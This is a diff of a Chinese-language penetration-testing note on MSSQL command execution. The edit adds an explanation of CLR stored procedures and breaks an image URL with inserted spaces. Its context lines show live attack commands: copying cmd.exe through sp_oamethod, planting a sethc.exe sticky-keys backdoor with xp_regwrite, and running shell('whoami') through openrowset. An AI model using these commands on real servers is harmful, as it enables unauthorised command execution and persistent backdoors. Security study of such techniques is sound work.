@@ -233,10 +233,10 @@ exec sp_oamethod @o, 'copyfile',null,'c:\windows\system32\cmd.exe' ,'c:\windows\
 exec xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options\sethc.EXE','Debugger','REG_SZ','c:\windows\system32\cmd.exe';
 ```
 ## CLR执行命令
-
+SQLServer 2005以后支持调用CLR(公告语言运行时)的存储过程,即支持在sqlserver中运行.net代码.
 ### 创建sql文件
 勾选创建sql文件,选3.5Net 兼容性更好
-![CLR1.png](https://cdn.nlark.com/yuque/0/2021/png/12610959/1628249622336-34f54dea-5aae-4584-a80c-eeff2f1d3f01.png#clientId=ua0a461ef-7c4c-4&from=drop&id=u8a58121a&margin=%5Bobject%20Object%5D&name=CLR1.png&originHeight=561&originWidth=1027&originalType=binary&ratio=1&size=19411&status=done&style=none&taskId=u1c032984-9062-480c-a90b-156643f0370)
+![CLR1.png](https://cdn.nlark.com/yuque/0/2                                                                                  021/png/12610959/1628249622336-34f54dea-5aae-4584-a80c-eeff2f1d3f01.png#clientId=ua0a461ef-7c4c-4&from=drop&id=u8a58121a&margin=%5Bobject%20Object%5D&name=CLR1.png&originHeight=561&originWidth=1027&originalType=binary&ratio=1&size=19411&status=done&style=none&taskId=u1c032984-9062-480c-a90b-156643f0370)
 ![CLR2.png](https://cdn.nlark.com/yuque/0/2021/png/12610959/1628249599733-28ca397f-9873-4afe-8c0d-2f4171e28f6f.png#clientId=ua0a461ef-7c4c-4&from=drop&id=u85da9149&margin=%5Bobject%20Object%5D&name=CLR2.png&originHeight=752&originWidth=677&originalType=binary&ratio=1&size=17434&status=done&style=none&taskId=uf31ac0c7-d7e7-492f-8589-212abb76628)
 ### C#代码
 ```c
@@ -378,6 +378,7 @@ exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engine
 
 select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\dnary.mdb','select shell("whoami")')
 ```
+
 # Some Tricks
 
 [原文](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
